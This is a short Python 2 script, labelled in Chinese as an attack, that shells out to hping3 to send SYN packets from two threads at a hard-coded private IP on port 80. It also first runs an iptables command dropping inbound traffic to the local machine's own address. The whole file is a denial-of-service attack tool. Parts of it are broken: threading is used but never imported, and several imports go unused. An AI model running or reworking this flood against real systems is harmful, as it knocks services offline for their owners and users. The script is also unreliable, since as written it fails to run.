#coding=utf-8
import os
import re
import socket
import MySQLdb
from subprocess import Popen, PIPE
import socket, sys, random
from SimpleXMLRPCServer import SimpleXMLRPCServer

targets = '172.29.153.60'
ports = '80'
task_ids='1'
ip = socket.gethostbyname(socket.gethostname())


def prepare(ips):
    order_base='iptables -I INPUT --dst %s -j DROP' %ips
    resp = os.system(order_base)

def tcp_attack_hping(target, port,task_id):
    orders=' hping3 -i u1000 -c 100 -p %s -S  %s' %(port,target)
    resp = os.system(orders)
    return 1



if __name__ == '__main__':
    threads = []
    print '目标:%s    端口:%s ' %(targets,ports)
    print '攻击开始!' 
    prepare(ip)
    for i in range(2):
        t1=threading.Thread(target=tcp_attack_hping,args=(targets, ports,task_ids))
        threads.append(t1)
    for t in threads:
        t.setDaemon(True)
        t.start()
    t.join()
    print '攻击成功'
